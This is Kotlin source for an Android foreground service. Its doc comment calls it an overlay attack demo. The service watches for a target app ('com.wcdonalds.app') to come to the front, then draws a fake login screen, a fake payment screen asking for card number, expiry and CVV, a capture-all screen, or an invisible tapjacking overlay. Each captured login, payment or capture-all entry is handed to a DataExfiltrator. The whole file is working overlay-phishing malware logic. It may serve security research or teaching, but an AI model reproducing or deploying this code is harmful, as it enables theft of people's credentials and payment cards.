package com.ghosttouch.attacker.service

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.ghosttouch.attacker.capture.SessionRepository
import com.ghosttouch.attacker.exfil.DataExfiltrator
import com.ghosttouch.attacker.overlay.CaptureAllOverlay
import com.ghosttouch.attacker.overlay.FakeLoginOverlay
import com.ghosttouch.attacker.overlay.FakePaymentOverlay
import com.ghosttouch.attacker.overlay.OverlayManager
import com.ghosttouch.attacker.overlay.TapjackingOverlay

/**
 * Foreground service that orchestrates the overlay attack demo.
 *
 * ## State machine
 * The service uses a simple state machine to prevent flickering:
 * - IDLE: No overlay shown, polling for target app
 * - SHOWING: Overlay is displayed (or pending display), no re-triggers
 * - COOLDOWN: Recently dismissed, waiting before allowing re-trigger
 *
 * ## Attack modes
 * - **LOGIN**: Fake login screen matching target app
 * - **PAYMENT**: Fake payment screen
 * - **TAPJACKING**: Invisible overlay for click interception
 * - **CAPTURE_ALL**: Combined login + payment capture with auto-rotation
 */
class OverlayService : Service() {

    private lateinit var foregroundDetector: ForegroundDetector
    private lateinit var overlayManager: OverlayManager
    private val handler = Handler(Looper.getMainLooper())
    private var isPolling = false

    /** Service state machine to prevent flickering. */
    private enum class State { IDLE, SHOWING, COOLDOWN }
    private var state = State.IDLE

    /** Timestamp when cooldown started. */
    private var cooldownStartTime = 0L

    /** The polling runnable that checks the foreground app periodically. */
    private val pollRunnable = object : Runnable {
        override fun run() {
            if (!isPolling) return

            val foregroundPackage = foregroundDetector.getCurrentForegroundPackage()

            when (state) {
                State.IDLE -> {
                    if (foregroundPackage == TARGET_PACKAGE) {
                        Log.d(TAG, "Target detected in IDLE state — triggering overlay")
                        state = State.SHOWING
                        triggerOverlay()
                    }
                }
                State.SHOWING -> {
                    // Only hide if target app has DEFINITELY left foreground
                    // AND the overlay is actually visible (not just pending)
                    if (foregroundPackage != TARGET_PACKAGE &&
                        foregroundPackage.isNotEmpty() &&
                        overlayManager.isVisible) {
                        Log.d(TAG, "Target left foreground while SHOWING — hiding overlay")
                        overlayManager.hide()
                        enterCooldown()
                    }
                    // If overlay somehow disappeared but state is still SHOWING, reset
                    if (!overlayManager.isShowing && !overlayManager.isVisible) {
                        Log.d(TAG, "Overlay disappeared unexpectedly — returning to IDLE")
                        state = State.IDLE
                    }
                }
                State.COOLDOWN -> {
                    val elapsed = System.currentTimeMillis() - cooldownStartTime
                    if (elapsed > COOLDOWN_MS) {
                        Log.d(TAG, "Cooldown expired — returning to IDLE")
                        state = State.IDLE
                    }
                }
            }

            handler.postDelayed(this, POLL_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        foregroundDetector = ForegroundDetector(applicationContext)
        overlayManager = OverlayManager(applicationContext)
        NotificationHelper.createChannel(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        currentMode = intent?.getStringExtra(EXTRA_MODE) ?: MODE_LOGIN

        startForeground(
            NotificationHelper.NOTIFICATION_ID,
            NotificationHelper.buildServiceNotification(this)
        )

        // Reset state and start fresh
        state = State.IDLE
        startPolling()

        Log.d(TAG, "OverlayService started — mode: $currentMode, target: $TARGET_PACKAGE")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopPolling()
        overlayManager.hide()
        state = State.IDLE
        Log.d(TAG, "OverlayService destroyed")
        super.onDestroy()
    }

    private fun startPolling() {
        if (isPolling) return
        isPolling = true
        handler.post(pollRunnable)
    }

    private fun stopPolling() {
        isPolling = false
        handler.removeCallbacks(pollRunnable)
    }

    /** Transitions to cooldown state after an overlay is dismissed. */
    private fun enterCooldown() {
        state = State.COOLDOWN
        cooldownStartTime = System.currentTimeMillis()
        Log.d(TAG, "Entered COOLDOWN for ${COOLDOWN_MS}ms")
    }

    /** Common dismiss handler for all overlay types. */
    private fun onOverlayDismissed() {
        handler.post {
            overlayManager.hide()
            enterCooldown()
        }
    }

    /**
     * Triggers the appropriate overlay based on the current attack mode.
     */
    private fun triggerOverlay() {
        when (currentMode) {
            MODE_LOGIN -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                FakeLoginOverlay(
                    onCredentialsCaptured = { email, password ->
                        Log.d(TAG, "LOGIN captured — email: $email, pass length: ${password.length}")
                        val session = SessionRepository.captureLogin(
                            targetApp = TARGET_PACKAGE,
                            email = email,
                            password = password
                        )
                        DataExfiltrator.exfiltrate(session)
                    },
                    onDismiss = ::onOverlayDismissed
                )
            }

            MODE_PAYMENT -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                FakePaymentOverlay(
                    onPaymentCaptured = { cardNumber, expiry, cvv ->
                        Log.d(TAG, "PAYMENT captured — card: *${cardNumber.takeLast(4)}")
                        val session = SessionRepository.capturePayment(
                            targetApp = TARGET_PACKAGE,
                            cardNumber = cardNumber,
                            expiry = expiry,
                            cvv = cvv
                        )
                        DataExfiltrator.exfiltrate(session)
                    },
                    onDismiss = ::onOverlayDismissed
                )
            }

            MODE_CAPTURE_ALL -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                CaptureAllOverlay(
                    onDataCaptured = { fields ->
                        Log.d(TAG, "CAPTURE_ALL captured — ${fields.size} fields: ${fields.keys}")
                        val session = SessionRepository.captureAll(
                            targetApp = TARGET_PACKAGE,
                            fields = fields
                        )
                        DataExfiltrator.exfiltrate(session)
                    },
                    onDismiss = ::onOverlayDismissed
                )
            }

            MODE_TAPJACKING -> overlayManager.showTapjacking {
                TapjackingOverlay(
                    onTapDetected = { x, y ->
                        Log.d(TAG, "Tapjacking: tap at ($x, $y)")
                    }
                )
            }
        }
    }

    companion object {
        private const val TAG = "OverlayService"

        const val TARGET_PACKAGE = "com.wcdonalds.app"
        private const val POLL_INTERVAL_MS = 700L
        private const val OVERLAY_DELAY_MS = 400L
        private const val COOLDOWN_MS = 10_000L

        const val EXTRA_MODE = "attack_mode"

        const val MODE_LOGIN = "login"
        const val MODE_PAYMENT = "payment"
        const val MODE_TAPJACKING = "tapjacking"
        const val MODE_CAPTURE_ALL = "capture_all"

        var currentMode = MODE_LOGIN
            private set
    }
}
